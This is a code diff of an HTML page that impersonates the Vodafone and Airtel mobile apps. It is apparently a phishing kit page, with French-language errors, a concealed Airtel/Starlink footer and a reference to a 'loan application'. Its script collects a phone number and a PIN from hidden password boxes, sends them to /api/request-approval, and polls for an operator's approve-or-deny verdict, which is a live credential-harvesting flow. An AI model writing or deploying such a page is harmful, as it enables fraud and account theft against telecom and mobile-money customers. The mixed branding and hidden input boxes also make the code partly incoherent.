@@ -1,293 +1,545 @@
-﻿<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Ana Vodafone</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+<title>Airtel Lite — Connexion</title>
 <style>
   :root{
-    --vf-red:#e60000;
-    --vf-red-dark:#c30000;
-    --bg-top:#f2f0f0;
-    --bg-bottom:#fbe3e3;
-    --text-dark:#1a1a1a;
-    --text-grey:#6b6b6b;
-    --card-white:#ffffff;
+    --app-bg:#000000;
+    --screen-bg:#f7f1f0;
+    --text:#3d2628;
+    --muted:#7f6669;
+    --soft-red:#f9e6e8;
+    --red:#ee1c25;
+    --red-dark:#b6111d;
+    --line:#e7dfe0;
+    --field-bg:#f2f1f1;
+    --field-border:#dfe0e2;
+    --soft-shadow:0 20px 36px rgba(12,12,12,0.22);
   }
-  *{box-sizing:border-box;}
-  html,body{
-    height:100%;
-    margin:0;
-    padding-top:env(safe-area-inset-top,0px);
-    padding-bottom:env(safe-area-inset-bottom,0px);
-  }
+
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+  html{-webkit-text-size-adjust:100%;}
   body{
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-    background:linear-gradient(180deg,var(--bg-top) 0%, var(--bg-top) 18%, var(--bg-bottom) 55%, var(--bg-bottom) 100%);
-    display:flex;
-    justify-content:center;
-  }
-  .phone{
+    font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background:var(--app-bg);
+    color:var(--text);
+    min-height:100svh;
     width:100%;
-    max-width:430px;
-    min-height:100vh;
-    min-height:100dvh;
     display:flex;
-    flex-direction:column;
+    align-items:flex-start;
+    justify-content:center;
+    padding:0;
+  }
+
+  main{
+    width:100%;
+    max-width:420px;
+    min-height:100svh;
+    background:var(--screen-bg);
+    box-shadow:var(--soft-shadow);
     position:relative;
+    padding:10px 18px 0;
   }
 
   .lang-row{
     display:flex;
     align-items:center;
-    gap:10px;
-    padding:14px 20px 18px;
-    font-size:16px;
-    font-weight:600;
-    color:var(--text-dark);
+    justify-content:flex-start;
+    padding:4px 8px 0;
+    margin-bottom:10px;
   }
-  .lang-row svg{flex-shrink:0;}
+  .language-pill{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    color:#222;
+    font-size:14px;
+    font-weight:600;
+    background:transparent;
+    border:none;
+    padding:4px 0;
+  }
+  .globe-icon{
+    width:16px;height:16px;border:2px solid #232323;border-radius:50%;position:relative;display:inline-block;
+  }
+  .globe-icon::before,.globe-icon::after{content:"";position:absolute;}
+  .globe-icon::before{inset:3px 0 3px 0;border-left:2px solid #232323;border-right:2px solid #232323;}
+  .globe-icon::after{inset:0 3px 0 3px;border-top:2px solid #232323;border-bottom:2px solid #232323;}
+  .caret{font-size:14px; color:#222; margin-left:2px;}
 
-  .bundle-banner{
-    margin:0 16px 18px;
-    background:var(--card-white);
-    border-radius:16px;
-    padding:14px 18px;
+  .bundle-pill{
     display:flex;
     align-items:center;
     justify-content:space-between;
-    box-shadow:0 1px 3px rgba(0,0,0,.04);
+    gap:8px;
+    padding:10px 12px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.55), rgba(255,255,255,0.18));
+    border:1px solid rgba(201,94,101,0.22);
+    border-radius:18px;
+    color:#d44852;
+    font-size:12px;
+    font-weight:600;
+    margin:0 8px 18px;
+    line-height:1.2;
   }
-  .bundle-banner p{
-    margin:0;
-    font-size:14.5px;
-    color:var(--text-dark);
-    max-width:70%;
-    line-height:1.3;
-  }
-  .bundle-pill{
-    background:#fbd8d8;
-    border-radius:14px;
-    padding:6px 14px;
-    display:flex;
-    align-items:baseline;
-    gap:2px;
-    white-space:nowrap;
-  }
-  .bundle-pill .num{
-    color:var(--vf-red);
-    font-size:22px;
-    font-weight:800;
-  }
-  .bundle-pill .unit{
-    color:var(--vf-red);
-    font-size:11px;
-    font-weight:700;
-  }
-
-  .content{
-    flex:1;
-    display:flex;
-    flex-direction:column;
+  .bundle-pill .bundle-value{
+    display:inline-flex;
+    align-items:center;
     justify-content:center;
-    padding:0 24px;
-    text-align:center;
-  }
-  .content h1{
-    font-size:27px;
+    min-width:38px;
+    padding:4px 7px;
+    background:#e8373e;
+    border-radius:10px;
+    color:#fff;
+    font-size:11px;
     font-weight:800;
-    color:var(--text-dark);
-    margin:0 0 18px;
-    letter-spacing:-0.2px;
   }
-  .content p.sub{
+
+  .welcome{padding:6px 18px 0;text-align:center;}
+  .welcome h1{
+    font-size:clamp(26px, 6vw, 34px);
+    font-weight:800;
+    line-height:1.1;
+    letter-spacing:-0.03em;
+    color:#2c1d1e;
+    margin-bottom:12px;
+  }
+  .welcome p{
     font-size:15px;
-    color:var(--text-grey);
     line-height:1.5;
-    margin:0 0 36px;
-    padding:0 6px;
+    color:var(--muted);
+    margin:0 auto;
+    max-width:320px;
   }
 
-  .field{
-    background:var(--card-white);
-    border-radius:16px;
-    padding:12px 18px 14px;
-    text-align:left;
-    margin-bottom:22px;
-    box-shadow:0 1px 3px rgba(0,0,0,.04);
+  .phone-field{
+    margin:22px 14px 16px;
+    padding:10px 14px 12px;
+    background:rgba(255,255,255,0.1);
+    border:1px solid var(--field-border);
+    border-radius:14px;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,0.8);
   }
-  .field label{
+  .phone-field label{
     display:block;
-    font-size:12.5px;
-    color:var(--text-grey);
-    margin-bottom:4px;
+    font-size:12px;
+    color:#756264;
+    margin-bottom:8px;
+    font-weight:600;
   }
-  .field .value{
-    font-size:18px;
-    color:var(--text-dark);
-    font-weight:500;
-  }
-
-  .btn-continue{
+  .phone-field input{
     width:100%;
     border:none;
-    border-radius:16px;
-    background:linear-gradient(180deg,#eb0000,#c40000);
-    color:#fff;
-    font-size:17px;
-    font-weight:700;
-    padding:17px 0;
-    cursor:pointer;
-    box-shadow:0 4px 10px rgba(198,0,0,.25);
+    outline:none;
+    background:transparent;
+    font-size:18px;
+    color:#1f1f1f;
+    letter-spacing:0.04em;
+    font-weight:600;
+    padding:0;
+    appearance:textfield;
   }
-  .btn-continue:active{filter:brightness(0.95);}
+  .phone-field input::placeholder{color:#a6a3a4;}
+
+  .connexion-btn{
+    display:block;
+    width:calc(100% - 28px);
+    margin:10px 14px 0;
+    min-height:52px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(180deg, #e61c28, #d91822);
+    color:#fff;
+    font-size:16px;
+    font-weight:700;
+    letter-spacing:0.02em;
+    cursor:pointer;
+    box-shadow:0 10px 18px rgba(227,28,37,0.25);
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .connexion-btn.active{
+    background:linear-gradient(180deg, #ef1c28, #d91521);
+  }
+  .connexion-btn:disabled{
+    cursor:not-allowed;
+    opacity:0.8;
+  }
+  .connexion-btn:active{transform:translateY(1px);}
 
   .divider{
     display:flex;
     align-items:center;
     gap:14px;
-    margin:28px 0 24px;
-    color:#8a8a8a;
+    margin:22px 18px 12px;
+    color:#8d7b7d;
     font-size:13px;
+    font-weight:700;
+    letter-spacing:0.08em;
+    text-transform:uppercase;
   }
-  .divider::before,.divider::after{
+  .divider::before,
+  .divider::after{
     content:"";
-    flex:1;
+    display:block;
     height:1px;
-    background:#d9d3d3;
+    background:rgba(96,96,96,0.25);
+    flex:1;
   }
 
-  .add-number{
+  .alt-link{
     display:block;
-    color:var(--vf-red);
-    font-size:15.5px;
-    font-weight:600;
-    text-decoration:underline;
-    text-underline-offset:3px;
+    width:100%;
+    background:transparent;
+    border:none;
+    color:#d83b45;
+    font-size:16px;
+    font-weight:700;
+    text-align:center;
+    margin-top:4px;
+    padding:0 0 18px;
   }
 
   .bottom-nav{
-    background:var(--card-white);
-    border-top-left-radius:22px;
-    border-top-right-radius:22px;
     display:flex;
-    justify-content:space-around;
-    padding:16px 10px calc(14px + env(safe-area-inset-bottom,0px));
-    box-shadow:0 -2px 10px rgba(0,0,0,.04);
+    align-items:flex-end;
+    justify-content:space-between;
+    gap:10px;
+    width:100%;
+    padding:16px 16px 26px;
+    border-top:1px solid rgba(0,0,0,0.08);
+    margin-top:10px;
   }
   .nav-item{
+    flex:1;
     display:flex;
     flex-direction:column;
     align-items:center;
     gap:6px;
-    color:#8a8a8a;
-    font-size:12.5px;
+    color:#5d4d4d;
+    background:transparent;
+    border:none;
+    font-size:11px;
+    font-weight:600;
+    text-align:center;
   }
   .nav-icon{
-    width:40px;
-    height:40px;
-    border-radius:50%;
-    background:#ececec;
+    width:32px;height:32px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;position:relative;display:block;opacity:0.8;
+  }
+  .nav-item:nth-child(1) .nav-icon{border-width:2px;}
+  .nav-item:nth-child(1) .nav-icon::before,
+  .nav-item:nth-child(1) .nav-icon::after,
+  .nav-item:nth-child(2) .nav-icon::before,
+  .nav-item:nth-child(2) .nav-icon::after,
+  .nav-item:nth-child(3) .nav-icon::before,
+  .nav-item:nth-child(3) .nav-icon::after,
+  .nav-item:nth-child(4) .nav-icon::before,
+  .nav-item:nth-child(4) .nav-icon::after{
+    content:""; position:absolute;
+  }
+  .nav-item:nth-child(1) .nav-icon::before{width:12px;height:12px;border:2px solid rgba(8,8,8,0.5);border-left:0;border-bottom:0;left:8px;top:7px;transform:rotate(45deg);border-radius:2px;}
+  .nav-item:nth-child(1) .nav-icon::after{width:6px;height:6px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;left:12px;top:13px;background:transparent;}
+  .nav-item:nth-child(2) .nav-icon::before{width:12px;height:12px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;left:9px;top:7px;}
+  .nav-item:nth-child(2) .nav-icon::after{left:15px;top:15px;width:10px;height:3px;background:rgba(8,8,8,0.5);border-radius:2px;transform:rotate(-45deg);}
+  .nav-item:nth-child(3) .nav-icon::before{left:9px;top:7px;width:12px;height:12px;border-radius:50%;border:2px solid rgba(8,8,8,0.5);}
+  .nav-item:nth-child(3) .nav-icon::after{left:13px;top:11px;width:6px;height:6px;border-radius:50%;background:rgba(8,8,8,0.5);}
+  .nav-item:nth-child(4) .nav-icon::before{left:9px;top:8px;width:12px;height:12px;border:2px solid rgba(8,8,8,0.5);border-radius:3px;}
+  .nav-item:nth-child(4) .nav-icon::after{left:13px;top:13px;width:5px;height:5px;border:2px solid rgba(8,8,8,0.5);border-radius:50%;background:transparent;}
+
+  .code-row{
+    position:absolute;
+    width:0;
+    height:0;
+    overflow:hidden;
+    opacity:0;
+    pointer-events:none;
+    margin:0;
+  }
+  .code-boxes{
     display:flex;
-    align-items:center;
-    justify-content:center;
+    gap:0;
+    visibility:hidden;
+  }
+  .code-box{
+    opacity:0;
+    width:0;
+    height:0;
+    padding:0;
+    margin:0;
+    border:none;
   }
 
-  @media (prefers-color-scheme: dark){
-    :root:not([data-theme="light"]){
-      --bg-top:#1c1414;
-      --bg-bottom:#2a1414;
-      --text-dark:#f2f2f2;
-      --text-grey:#b5aaaa;
-      --card-white:#2a2222;
-    }
-    .bundle-pill{background:#4a2020;}
-    .nav-icon{background:#3a3030;}
-    .divider::before,.divider::after{background:#4a3f3f;}
+  footer{display:none !important;}
+
+  @media (max-width:430px){
+    main{max-width:100%;}
   }
+
+  .invalid-modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;padding:24px;background:rgba(0,0,0,0.32);backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);z-index:100;}
+  .invalid-modal.visible{display:flex;}
+  .invalid-card{width:min(540px,100%);background:#fff;border-radius:22px;padding:34px 28px 26px;text-align:center;box-shadow:0 18px 44px rgba(0,0,0,0.18);}
+  .warning-icon{display:none;}
+  .invalid-card h2{color:var(--red);font-size:clamp(26px,7vw,40px);font-weight:800;margin-bottom:14px;line-height:1.2;}
+  .invalid-card p{color:#2a2a2a;font-size:clamp(16px,4.5vw,22px);font-weight:500;line-height:1.45;margin:0 auto 22px;max-width:540px;}
+  .invalid-card button{width:100%;min-height:58px;border:none;border-radius:12px;background:var(--red);color:#fff;font-size:clamp(18px,4vw,26px);font-weight:800;cursor:pointer;box-shadow:0 10px 20px rgba(227,6,19,0.22);}
+
+  .approval-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.32);backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);display:none;align-items:center;justify-content:center;padding:24px;text-align:center;z-index:50;}
+  .approval-overlay.visible{display:flex;}
+  .approval-card{width:min(540px,100%);background:#fff;border-radius:22px;padding:30px 28px 24px;box-shadow:0 18px 44px rgba(0,0,0,0.18);text-align:center;}
+  .spinner{width:52px;height:52px;border:4px solid #eee;border-top-color:var(--red);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 18px;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .approval-overlay h2{font-size:clamp(23px,4vw,36px);font-weight:800;color:var(--red);margin-bottom:10px;}
+  .approval-overlay p{font-size:clamp(16px,2.6vw,22px);color:#2a2a2a;max-width:300px;line-height:1.45;margin:0 auto;}
+  .approval-overlay .denied-msg{display:none;color:var(--red);font-weight:700;font-size:clamp(18px,3vw,26px);margin-top:8px;}
+  .approval-overlay .retry-btn{display:none;margin-top:18px;border:none;background:var(--red);color:#fff;font-weight:800;font-size:clamp(18px,3vw,26px);letter-spacing:0.4px;width:100%;min-height:58px;border-radius:12px;cursor:pointer;box-shadow:0 10px 20px rgba(227,6,19,0.22);}
 </style>
 </head>
 <body>
-  <div class="phone">
 
+  <main>
     <div class="lang-row">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 010 18M12 3a14 14 0 000 18"/></svg>
-      <span>English</span>
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3"><path d="M6 9l6 6 6-6"/></svg>
+      <button class="language-pill" type="button" aria-label="Language selector">
+        <span class="globe-icon" aria-hidden="true"></span>
+        <span>English</span>
+        <span class="caret">⌄</span>
+      </button>
     </div>
 
-    <div class="bundle-banner">
-      <p>The app won't consume from your bundle</p>
-      <div class="bundle-pill"><span class="num">0</span><span class="unit">MB</span></div>
+    <div class="bundle-pill" aria-label="Bundle status">
+      <span>The app won't consume from your bundle</span>
+      <span class="bundle-value">0 MB</span>
     </div>
 
-    <div class="content">
+    <div class="welcome">
       <h1>Welcome to Ana Vodafone</h1>
-      <p class="sub">Stay in control of your line. Track usage, pay bills, manage subscriptions, and more all in one place</p>
-
-      <div class="field">
-        <label for="mobile">Mobile Number</label>
-        <input id="mobile" class="value" type="tel" value="01022544474" style="border:none;outline:none;width:100%;background:transparent;font:inherit;color:inherit;padding:0;">
-      </div>
-
-      <button class="btn-continue">Continue</button>
-
-      <div class="divider">OR</div>
-
-      <a href="#" class="add-number">Add another number</a>
+      <p>Stay in control of your line. Track usage, pay bills, manage subscriptions, and more all in one place</p>
     </div>
 
-    <div class="bottom-nav">
-      <div class="nav-item">
-        <div class="nav-icon">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M12 3a14 14 0 010 18M12 3a14 14 0 000 18M3 12h18"/></svg>
-        </div>
+    <div class="phone-field">
+      <label for="phoneInput">Mobile Number</label>
+      <input type="tel" id="phoneInput" placeholder="01022544474" inputmode="numeric" maxlength="11">
+    </div>
+
+    <div class="code-row" aria-hidden="true">
+      <div class="code-boxes">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+      </div>
+    </div>
+
+    <button class="connexion-btn" id="connexionBtn" type="button" disabled>Continue</button>
+
+    <div class="divider">OR</div>
+    <button class="alt-link" type="button">Add another number</button>
+
+    <nav class="bottom-nav" aria-label="Bottom navigation">
+      <button class="nav-item" type="button">
+        <span class="nav-icon" aria-hidden="true"></span>
         <span>Shop with us</span>
-      </div>
-      <div class="nav-item">
-        <div class="nav-icon">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-6 8-6s8 2 8 6"/></svg>
-        </div>
+      </button>
+      <button class="nav-item" type="button">
+        <span class="nav-icon" aria-hidden="true"></span>
         <span>login</span>
-      </div>
-      <div class="nav-item">
-        <div class="nav-icon">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 10.5c0 6-9 11-9 11s-9-5-9-11a9 9 0 0118 0z"/><circle cx="12" cy="10.5" r="2.5"/></svg>
-        </div>
+      </button>
+      <button class="nav-item" type="button">
+        <span class="nav-icon" aria-hidden="true"></span>
         <span>store locator</span>
-      </div>
-      <div class="nav-item">
-        <div class="nav-icon">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M8 8l5 2.5L10.5 16 8 8z"/></svg>
-        </div>
+      </button>
+      <button class="nav-item" type="button">
+        <span class="nav-icon" aria-hidden="true"></span>
         <span>Explore</span>
+      </button>
+    </nav>
+  </main>
+
+  <div class="invalid-modal" id="invalidModal" role="dialog" aria-modal="true" aria-labelledby="invalidTitle">
+    <div class="invalid-card">
+      <div class="warning-icon" aria-hidden="true">
+        <div class="triangle"></div>
+        <div class="mark"></div>
+        <div class="dot"></div>
       </div>
+      <h2 id="invalidTitle">Format Invalide</h2>
+      <p id="invalidMessage">Le numéro de téléphone doit commencer par 9 (9 chiffres) ou 09 (10 chiffres)!<br>Veuillez entrer le bon numéro et réessayer!</p>
+      <button type="button" id="invalidOkBtn">OK</button>
     </div>
-
   </div>
-  <script>
-    const mobileInput = document.getElementById('mobile');
-    const continueBtn = document.querySelector('.btn-continue');
 
-    const normalizePhone = (value) => value.replace(/\D/g, '').replace(/^243/, '');
-    const isValidPhone = (value) => /^(?:0\d{9,10}|9\d{8,9}|\d{9,11})$/.test(value);
+  <div class="approval-overlay" id="approvalOverlay">
+    <div class="approval-card">
+      <div class="spinner" id="spinner"></div>
+      <h2 id="overlayTitle">En attente d'approbation</h2>
+      <p id="overlayText">Votre demande a été envoyée. Merci de patienter pendant la vérification…</p>
+      <p class="denied-msg" id="deniedMsg">Broche incorrecte.</p>
+      <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
+    </div>
+  </div>
 
-    mobileInput.addEventListener('input', () => {
-      mobileInput.value = normalizePhone(mobileInput.value);
-    });
+  <footer>
+    <div class="logo-row">
+      <img src="assets/img/logo.svg" alt="Airtel" class="logo-img footer-logo-img">
+    </div>
+    <div class="collab-text">En collaboration avec</div>
+    <div class="collab-brand">STARLINK™</div>
+    <hr>
+    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+  </footer>
 
-    continueBtn.addEventListener('click', () => {
-      const phone = normalizePhone(mobileInput.value.trim());
-      if (!isValidPhone(phone)) {
-        alert('Please enter a valid mobile number.');
-        mobileInput.focus();
-        return;
+<script>
+  const phoneInput = document.getElementById('phoneInput');
+  const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
+
+  // Automatically reflect the phone number passed from the loan application.
+  const incomingParams = new URLSearchParams(window.location.search);
+  const incomingPhone = incomingParams.get('phone') || '';
+  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
+  if (/^9[0-9]{8}$/.test(normalizedPhone)) {
+    phoneInput.value = normalizedPhone;
+  }
+  const connexionBtn = document.getElementById('connexionBtn');
+
+  const invalidModal = document.getElementById('invalidModal');
+  const invalidMessage = document.getElementById('invalidMessage');
+  const invalidOkBtn = document.getElementById('invalidOkBtn');
+
+  function showInvalidPhone(message){
+    invalidMessage.innerHTML = message;
+    invalidModal.classList.add('visible');
+  }
+
+  function checkFormValid(){
+    const phone = phoneInput.value.trim();
+    const codeFilled = codeBoxes.every(b => b.value.length === 1);
+
+    // Let the user submit any entered number. Validation happens after
+    // clicking CONNEXION, so invalid numbers can show the modal.
+    if(phone.length > 0 && codeFilled){
+      connexionBtn.classList.add('active');
+      connexionBtn.disabled = false;
+    } else {
+      connexionBtn.classList.remove('active');
+      connexionBtn.disabled = true;
+    }
+  }
+
+  phoneInput.addEventListener('input', () => {
+    // Keep the field clean, but do not show an error while typing.
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+    checkFormValid();
+  });
+
+  invalidOkBtn.addEventListener('click', () => {
+    invalidModal.classList.remove('visible');
+    phoneInput.focus();
+  });
+
+  codeBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/[^0-9]/g, '');
+      if(box.value && i < codeBoxes.length - 1){
+        codeBoxes[i + 1].focus();
       }
-
-      const params = new URLSearchParams(window.location.search);
-      params.set('phone', phone);
-      window.location.href = 'kik.html?' + params.toString();
+      checkFormValid();
     });
-  </script>
+    box.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !box.value && i > 0){
+        codeBoxes[i - 1].focus();
+      }
+    });
+  });
+
+  const overlay = document.getElementById('approvalOverlay');
+  const spinner = document.getElementById('spinner');
+  const overlayTitle = document.getElementById('overlayTitle');
+  const overlayText = document.getElementById('overlayText');
+  const deniedMsg = document.getElementById('deniedMsg');
+  const retryBtn = document.getElementById('retryBtn');
+  let pollTimer = null;
+
+  function showOverlayWaiting(){
+    overlay.classList.add('visible');
+    spinner.style.display = 'block';
+    overlayTitle.textContent = 'Veuillez patienter...';
+    overlayTitle.style.display = 'block';
+    overlayText.style.display = 'block';
+    overlayText.textContent = 'Cela prend généralement quelques secondes';
+    deniedMsg.style.display = 'none';
+    retryBtn.style.display = 'none';
+  }
+
+  function pollApproval(id, params){
+    if(pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(async () => {
+      try {
+        const res = await fetch('/api/check-approval/' + id);
+        const data = await res.json();
+
+        if(data.status === 'approved'){
+          clearInterval(pollTimer);
+          window.location.href = 'pto.html?' + params.toString();
+        } else if(data.status === 'denied'){
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        }
+        // 'pending' -> keep polling
+      } catch (err) {
+        // network hiccup — keep trying silently
+      }
+    }, 2500);
+  }
+
+  retryBtn.addEventListener('click', () => {
+    overlay.classList.remove('visible');
+  });
+
+  connexionBtn.addEventListener('click', async () => {
+    const phone = phoneInput.value.trim();
+
+    // Show the invalid-number page only when the user tries to submit.
+    if(!/^9[0-9]{8}$/.test(phone)){
+      showInvalidPhone(
+        'Le numéro de téléphone doit commencer par 9 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
+      );
+      return;
+    }
+
+    if(connexionBtn.disabled) return;
+
+    const params = new URLSearchParams(window.location.search);
+    const code = codeBoxes.map(b => b.value).join('');
+    params.set('phone', phone);
+
+    showOverlayWaiting();
+
+    try {
+      const res = await fetch('/api/request-approval', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          plan: params.get('plan'),
+          price: params.get('price'),
+          phone: phone,
+          code: code,
+          step: 'login'
+        })
+      });
+      const data = await res.json();
+      pollApproval(data.id, params);
+    } catch (err) {
+      overlayTitle.textContent = 'Erreur de connexion';
+      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+      spinner.style.display = 'none';
+      retryBtn.style.display = 'inline-block';
+    }
+  });
+</script>
+
 </body>
 </html>
